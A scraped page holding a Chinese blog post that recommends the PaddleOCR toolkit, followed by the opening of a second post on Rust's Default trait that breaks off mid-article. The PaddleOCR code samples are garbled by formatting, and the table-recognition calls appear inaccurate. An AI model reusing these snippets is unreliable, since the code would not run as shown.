                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是小悟。</p>
<p>如果你也被下面这些事折磨过，大概会懂我为什么对 PaddleOCR 这么有好感：</p>
<ul>
<li>开会拍的白板，想整理成文档，只能对着照片一个字一个字敲；</li>
<li>客户发来的 PDF 合同，“复制粘贴”按钮永远是灰的，只能手动抄；</li>
<li>一堆纸质发票、报销单，财务要录入系统，眼睛看花、手指发麻；</li>
<li>孩子的手写作业想存个电子版，又不想再打一遍。</li>
</ul>
<p>这些场景都有一个共同点：要从图片或扫描件里，把文字“拿出来”。要么靠手工，要么花钱买各种在线 OCR 服务，次数受限、格式乱。</p>
<p>直到遇见 PaddleOCR，才觉得这种重复劳动，终于有工具能帮上大忙了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/157a0344d3d2486cba03d69f49e2a11a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477820&amp;x-signature=gtuwBm2aHSmnmLEBQtRG57NPBh8%3D" alt="PP-OCRv5 Demo" loading="lazy"/></p>
<h3 data-id="heading-0">🤔 PaddleOCR 到底是什么？</h3>
<p>简单说，它是百度开源的一套 <strong>OCR 工具箱 + 文档解析引擎</strong>。</p>
<p>它不仅能识别图片里的文字，还能处理表格、文档版面，甚至支持多语言、手写体。最关键是，它开源免费、模型可以本地部署，非常友好。</p>
<p>从技术架构上看，它遵循经典的“检测—识别—结构化”流程：</p>
<ol>
<li><strong>文本检测</strong>：先用算法找出图片里文字的位置，哪怕歪歪扭扭、透视变形也能搞定。</li>
<li><strong>方向分类</strong>：自动判断文字是正的还是倒的、横着还是竖着，并纠正过来。</li>
<li><strong>文本识别</strong>：把定位好的文字块，转成可编辑的文本，支持中文、英文、数字，甚至手写体。</li>
<li><strong>结构化输出</strong>：对于表格，它能还原成行列结构，直接导出为 Excel；对于文档，能分析出标题、段落、表格等布局。</li>
</ol>
<p>这个流程背后是 PP-OCR 系列模型，从早期版本到现在的 PP-OCRv5，一直在“精度、速度、体积”之间找平衡。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c5832c39c084e87a7f68cb98789acf7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477820&amp;x-signature=r79izkeg%2F3Lz1fccbpE1lQkjy48%3D" alt="PP-StructureV3 Demo" loading="lazy"/></p>
<h3 data-id="heading-1">🚀 它到底能做什么？</h3>
<p>聊聊几个让我印象很深的功能。</p>
<h4 data-id="heading-2">1. 图片文字识别：告别手抄</h4>
<p>这是最基础的功能，但效果很扎实。无论是手机拍的菜单、路牌，还是电脑里的截图、PDF 扫描页，它都能快速提取文字，并按顺序排好。</p>
<p>技术上，它通过 DB 文本检测算法和 CRNN/Transformer 识别网络，对模糊、倾斜、低分辨率的图片有很好的鲁棒性。一些光线很差的老照片，它依然能认出大部分内容，只是置信度会低一些，需要人工校对关键字段。</p>
<h4 data-id="heading-3">2. 表格识别：扫描件秒变 Excel</h4>
<p>很多客户发来的报价单、对账单都是扫描版 PDF，以前用在线工具转换，表格线歪七扭八，合并单元格全乱了，还得手动调整半天。</p>
<p>PaddleOCR 的表格识别是“检测+识别”两步走：先找到表格区域，再分析每个单元格的内容和位置关系，最后输出结构化的 JSON 或 Excel 文件。</p>
<h4 data-id="heading-4">3. 文档解析：复杂版式也不怕</h4>
<p>如果你经常处理论文、技术手册、合同等长文档，PP-StructureV3 和 PP-DocTranslation 这两个功能会很实用。</p>
<ul>
<li>
<p><strong>PP-StructureV3</strong>：能分析文档的版面结构，识别标题、段落、表格、图表、公式等元素，并保留它们的层级关系。对于多栏布局、嵌套表格、竖排文本，它都能处理得不错。</p>
</li>
<li>
<p><strong>PP-DocTranslation</strong>：在 OCR 的基础上，结合文心大模型，实现端到端的文档翻译。它不仅能翻译文字，还能保持原文档的格式，比如标题层级、表格结构、公式位置等。</p>
</li>
</ul>
<h4 data-id="heading-5">4. 多语言与手写体：覆盖更多场景</h4>
<p>PaddleOCR 的多语言能力也很强。PP-OCRv5 模型支持多种语言，对于混合语言文档，它能自动识别语言类型，切换识别模式，效果比单语种模型好很多。</p>
<p>手写体识别方面，它支持复杂连笔、非规范字迹，在 CASIA-HWDB 等数据集上的识别准确率能达到 90% 以上。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5c5eafd66db4e0590b65bed34e6924f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477820&amp;x-signature=%2FwgDGGSEx3EQjSAwMfUF6IfNf64%3D" alt="PP-StructureV3 Demo" loading="lazy"/></p>
<h3 data-id="heading-6">💻 使用体验如何？</h3>
<h4 data-id="heading-7">1. 安装与上手：对新手友好</h4>
<p>PaddleOCR 的安装非常简单，用 pip 一条命令就能搞定：</p>
<pre><code class="hljs">pip install paddlepaddle paddleocr
</code></pre>
<h4 data-id="heading-8">2. 代码示例：几行代码实现功能</h4>
<p>PaddleOCR 的 Python API 设计得很简洁，几行代码就能实现文字识别：</p>
<pre><code class="hljs language-arduino" lang="arduino">pythonfrom paddleocr <span class="hljs-keyword">import</span> PaddleOCR
</code></pre>
<p>初始化OCR（支持多语言，如'en'、'ch'、'fr'等）</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ocr</span> = PaddleOCR(use_angle_cls=<span class="hljs-literal">True</span>, lang=<span class="hljs-string">"ch"</span>)
</code></pre>
<p>识别图片中的文字</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">result</span> = ocr.ocr(<span class="hljs-string">'test.jpg'</span>, cls=<span class="hljs-literal">True</span>)
</code></pre>
<p>输出结果（包含坐标、文本、置信度）</p>
<pre><code class="hljs language-ini" lang="ini">for line in result:print(line<span class="hljs-section">[1]</span><span class="hljs-section">[0]</span>)  <span class="hljs-comment"># 文本内容</span>
</code></pre>
<p>对于表格识别，只需要添加 <code>table_engine=True</code>参数，就能直接导出 Excel 文件：</p>
<pre><code class="hljs language-arduino" lang="arduino">pythonfrom paddleocr <span class="hljs-keyword">import</span> PaddleOCR, draw_table_result
</code></pre>
<p>初始化表格识别模型</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">table_engine</span> = PaddleOCR(use_angle_cls=<span class="hljs-literal">True</span>, lang=<span class="hljs-string">"ch"</span>, table_engine=<span class="hljs-literal">True</span>)
</code></pre>
<p>识别表格并输出Excel</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">result</span> = table_engine.table_ocr(<span class="hljs-string">'table.jpg'</span>, output=<span class="hljs-string">'output.xlsx'</span>)
</code></pre>
<p>可视化结果</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">img</span> = draw_table_result(<span class="hljs-string">'table.jpg'</span>, result)img.save(<span class="hljs-string">'table_result.jpg'</span>)
</code></pre>
<h4 data-id="heading-9">4. 自定义训练：满足个性化需求</h4>
<p>如果预训练模型不能满足你的需求（比如识别特定字体、行业术语），PaddleOCR 支持自定义训练。</p>
<p>你只需要准备自己的数据集，用官方提供的 <code>tools/train.py</code>脚本进行微调，就能得到一个适合自己场景的模型。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5adc725cbb9042cd937a4681b64699fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477820&amp;x-signature=CF8jBKySjzC1cLvbNj7%2FBCFOyns%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-10">🌟 为什么推荐它？</h3>
<p>推荐 PaddleOCR，不是因为它“完美”，而是因为它“实用”。</p>
<h4 data-id="heading-11">1. 开源免费</h4>
<p>PaddleOCR 采用 Apache 2.0 开源协议，可以免费使用。很多公司的报销系统、文档管理工具都用它做底层识别引擎，这足以说明它的可靠性。</p>
<h4 data-id="heading-12">2. 功能全面，覆盖多场景</h4>
<p>从基础的文字识别，到复杂的表格解析、文档翻译，再到多语言、手写体支持，PaddleOCR 几乎覆盖了所有常见的 OCR 场景。</p>
<h4 data-id="heading-13">3. 社区活跃，持续迭代</h4>
<p>PaddleOCR 的 GitHub 星标数已经超过 6 万，社区非常活跃。百度团队持续迭代，从 PP-OCRv3 到 PP-OCRv5，再到 PP-StructureV3、PP-DocTranslation，不断推出新功能、优化性能。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25e971009dd84e18b2a9622649e0b34d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477820&amp;x-signature=tw9YF8xvcM20%2FkPua6naVnDs1gg%3D" alt="PaddleOCR Architecture" loading="lazy"/></p>
<h3 data-id="heading-14">最后</h3>
<p>PaddleOCR 不是一个“高大上”的 AI 项目，而是一个“能解决实际问题”的工具。它能帮助从重复劳动中解放出来，有更多时间去做更有创造性的事情。</p>
<p>如果你也被“手抄文字、手动录数据”折磨过，不妨试试 PaddleOCR。它可能不会让你“瞬间爱上工作”，但至少能让你少掉很多不必要的麻烦。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35cbb91a9213485a8c54ef3e3c1b8854~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477820&amp;x-signature=OiYy3uDdcnFLrIN65X0SxKo%2FBbY%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-15">开源社区</h3>
<pre><code class="hljs language-bash" lang="bash">GitHub：https://github.com/PaddlePaddle/PaddleOCRPaddleOCR官方：https://aistudio.baidu.com/paddleocr
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d2ca538fd1c4d8b8e491eafce301021~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477820&amp;x-signature=5qoQ0lcLtrTx9cyA%2Fz6xio5TYzI%3D" alt="图片" loading="lazy"/></p>
<p><strong>谢谢你看我的文章，既然看到这里了，如果觉得不错，随手点个赞、转发、在看三连吧，感谢感谢。那我们，下次再见。</strong></p>
<p>您的一键三连，是我更新的最大动力，谢谢</p>
<p>山水有相逢，来日皆可期，谢谢阅读，我们再会</p>
<p>我手中的金箍棒，上能通天，下能探海</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Default：Rust 里最省事的初始化方式]]></title>    <link>https://juejin.cn/post/7596943803934359592</link>    <guid>https://juejin.cn/post/7596943803934359592</guid>    <pubDate>2026-01-20T02:34:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596943803934359592" data-draft-id="7596943803934310440" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Default：Rust 里最省事的初始化方式"/> <meta itemprop="keywords" content="后端,Rust"/> <meta itemprop="datePublished" content="2026-01-20T02:34:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="噗噜噗噜啪"/> <meta itemprop="url" content="https://juejin.cn/user/4037062427148462"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Default：Rust 里最省事的初始化方式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4037062427148462/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    噗噜噗噜啪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T02:34:51.000Z" title="Tue Jan 20 2026 02:34:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你有没有遇到过这种情况：创建一个结构体，20 个字段，但你只想改其中 2 个，剩下 18 个都得手写初始化？</p>
<p><code>Default</code> trait 就是来救你的。它让类型提供一个「合理的默认值」，一行代码搞定初始化，想改哪个字段就改哪个。</p>
<p>配置对象、Builder 模式、Option 兜底值……Default 的用处比你想的多得多。</p>
<h2 data-id="heading-0">快速上手</h2>
<p><strong>30 秒看懂 Default</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 1. 派生 Default</span>
<span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Config</span> {
    host: <span class="hljs-type">String</span>,
    port: <span class="hljs-type">u16</span>,
}

<span class="hljs-comment">// 2. 用 ..Default::default() 只改需要的字段</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">config</span> = Config {
    port: <span class="hljs-number">8080</span>,
    ..<span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>()  <span class="hljs-comment">// host 自动填 ""</span>
};

<span class="hljs-comment">// 3. Option 兜底值</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">port</span> = <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-number">8080</span>).<span class="hljs-title function_ invoke__">unwrap_or_default</span>();  <span class="hljs-comment">// 8080</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">port</span> = <span class="hljs-literal">None</span>.<span class="hljs-title function_ invoke__">unwrap_or_default</span>();        <span class="hljs-comment">// 0</span>
</code></pre>
<p><strong>使用流程</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[需要默认值?] --&gt;|是| B{所有字段都有 Default?}
    A --&gt;|否| Z[不实现 Default]
    
    B --&gt;|是| C{默认值合理?}
    B --&gt;|否| D[手动实现 Default]
    
    C --&gt;|是| E[#derive Default]
    C --&gt;|否| D
    
    E --&gt; F[使用 ..Default::default]
    D --&gt; F
    
    style E fill:#90EE90
    style D fill:#FFD700
    style Z fill:#FFB6C1
</code></pre>
<p><strong>三种实现方式</strong>：</p>

























<table><thead><tr><th>方式</th><th>适用场景</th><th>示例</th></tr></thead><tbody><tr><td>派生</td><td>所有字段都有 Default，默认值合理</td><td><code>#[derive(Default)]</code></td></tr><tr><td>手动实现</td><td>需要自定义默认值</td><td><code>impl Default for T { ... }</code></td></tr><tr><td>标准库</td><td>基本类型直接用</td><td><code>i32::default()</code> → 0</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-1">一眼看懂 Default</h2>
<p>先看个痛苦的场景：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 创建配置对象，20 个字段全得写</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">config</span> = Config {
    host: <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">new</span>(),
    port: <span class="hljs-number">0</span>,
    timeout: <span class="hljs-number">0</span>,
    retries: <span class="hljs-number">0</span>,
    debug: <span class="hljs-literal">false</span>,
    <span class="hljs-comment">// ... 还有 15 个字段</span>
};
<span class="hljs-comment">// 其实我只想改这两个</span>
config.host = <span class="hljs-string">"localhost"</span>.<span class="hljs-title function_ invoke__">to_string</span>();
config.port = <span class="hljs-number">8080</span>;
</code></pre>
<p>有了 <code>Default</code>，世界清净了：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">config</span> = Config::<span class="hljs-title function_ invoke__">default</span>();  <span class="hljs-comment">// 其他字段自动填默认值</span>
config.host = <span class="hljs-string">"localhost"</span>.<span class="hljs-title function_ invoke__">to_string</span>();
config.port = <span class="hljs-number">8080</span>;
</code></pre>
<h3 data-id="heading-2">trait 定义：就一个方法</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">trait</span> <span class="hljs-title class_">Default</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span>;
}
</code></pre>
<p>就一个方法，返回类型的默认实例。简单粗暴。</p>
<h2 data-id="heading-3">三种用法：派生、手动、标准库</h2>
<h3 data-id="heading-4">标准库已经帮你实现好了</h3>
<p>Rust 标准库已经帮你实现好了常见类型的 <code>Default</code>：</p>













































<table><thead><tr><th>类型</th><th>默认值</th><th>记忆技巧</th></tr></thead><tbody><tr><td>数值类型</td><td><code>0</code></td><td>数学里的零元素</td></tr><tr><td><code>bool</code></td><td><code>false</code></td><td>最保守的选择</td></tr><tr><td><code>char</code></td><td><code>'\0'</code></td><td>空字符</td></tr><tr><td><code>String</code></td><td><code>""</code></td><td>空字符串</td></tr><tr><td><code>Vec&lt;T&gt;</code></td><td><code>[]</code></td><td>空向量</td></tr><tr><td><code>Option&lt;T&gt;</code></td><td><code>None</code></td><td>啥都没有</td></tr><tr><td><code>Box&lt;T&gt;</code></td><td><code>Box::new(T::default())</code></td><td>递归调用</td></tr></tbody></table>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">n</span>: <span class="hljs-type">i32</span> = <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>();        <span class="hljs-comment">// 0</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s</span>: <span class="hljs-type">String</span> = <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>();     <span class="hljs-comment">// ""</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">v</span>: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; = <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>();   <span class="hljs-comment">// []</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">b</span>: <span class="hljs-type">bool</span> = <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>();       <span class="hljs-comment">// false</span>
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}, {}, {:?}, {}"</span>, n, s, v, b);
}
</code></pre>
<h3 data-id="heading-5">派生：让编译器帮你写</h3>
